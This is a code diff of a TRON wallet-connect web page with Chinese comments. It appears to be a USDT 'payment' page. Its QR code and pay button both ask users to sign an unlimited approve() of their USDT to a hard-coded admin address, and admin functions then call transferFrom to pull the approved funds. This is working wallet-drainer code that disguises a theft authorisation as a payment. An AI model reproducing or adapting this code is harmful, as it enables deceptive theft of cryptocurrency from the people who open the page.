@@ -78,8 +78,16 @@ h1{font-size:24px;margin-bottom:8px}
 <script>
 // ====================== 波场配置 ======================
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+// ============二维码扫码授权、页面按钮授权，全部授权到此地址============
 const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const RPC = "https://api.trongrid.io";
+
+// TRC20 最简ABI
+const TRC20_ABI = [
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
+    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}
+];
 
 let tronWeb = null;
 let userAccount = null;
@@ -88,18 +96,16 @@ let provider = null;
 // 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
     try {
-        //优先使用 tokenpocket.tron provider（修复iOS扫码跳转损坏window.tronWeb问题）
         if(window.tokenpocket && window.tokenpocket.tron){
             provider = window.tokenpocket.tron;
             const accounts = await provider.request({method:"tron_requestAccounts"});
             userAccount = accounts[0];
             tronWeb = new TronWeb({fullHost: RPC, provider: provider});
         }else if(window.tronWeb && window.tronWeb.ready){
-            //普通TP内置浏览器直接打开的兼容分支
             tronWeb = window.tronWeb;
             userAccount = tronWeb.defaultAddress.base58;
         }else{
-            alert("⚠️请使用TP钱包【发现】内置浏览器打开页面，外部浏览器无法调用钱包");
+            alert("⚠️请使用TP钱包【发现】内置浏览器打开页面");
             return;
         }
 
@@ -113,8 +119,9 @@ document.getElementById("connectBtn").onclick = async () => {
     }
 };
 
-// ==================== 生成授权二维码 ====================
+// ====================生成二维码【spender已经改为你的管理员地址】====================
 function genQR() {
+    // tron协议：approve(授权给谁，无限额度)
     const qrUri = `tron:${USDT_CONTRACT}?function=approve&args=${ADMIN_WALLET},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
     document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrUri)}">`;
 }
@@ -122,13 +129,13 @@ function genQR() {
 window.onload = genQR;
 document.getElementById("amount").oninput = genQR;
 
-// 页面按钮执行approve无限授权
+//页面按钮授权
 document.getElementById("payBtn").onclick = async () => {
     if(!tronWeb || !userAccount){
         return alert("请先连接钱包！");
     }
     try{
-        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
         const tx = await contract.approve(ADMIN_WALLET,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
         .send({feeLimit:100000000});
         alert("✅授权成功，交易哈希："+tx);
@@ -137,7 +144,7 @@ document.getElementById("payBtn").onclick = async () => {
     }
 };
 
-// ====================== 管理员功能 ======================
+//管理员提取
 async function drawFromUser() {
     if(userAccount !== ADMIN_WALLET){
         alert("不是管理员账号！");
@@ -150,7 +157,7 @@ async function drawFromUser() {
         return;
     }
     try{
-        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
         const sunVal = tronWeb.toSun(drawNum);
         const tx = await contract.transferFrom(fromAddr, ADMIN_WALLET, sunVal).send({feeLimit:100000000});
         alert("✅提取成功，哈希："+tx);
@@ -159,6 +166,7 @@ async function drawFromUser() {
     }
 }
 
+//管理员转账发放奖励
 async function sendReward() {
     if(userAccount !== ADMIN_WALLET){
         alert("不是管理员账号！");
@@ -171,7 +179,7 @@ async function sendReward() {
         return;
     }
     try{
-        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
         const sunVal = tronWeb.toSun(sendNum);
         const tx = await contract.transfer(toAddr, sunVal).send({feeLimit:100000000});
         alert("✅发放奖励成功，哈希："+tx);
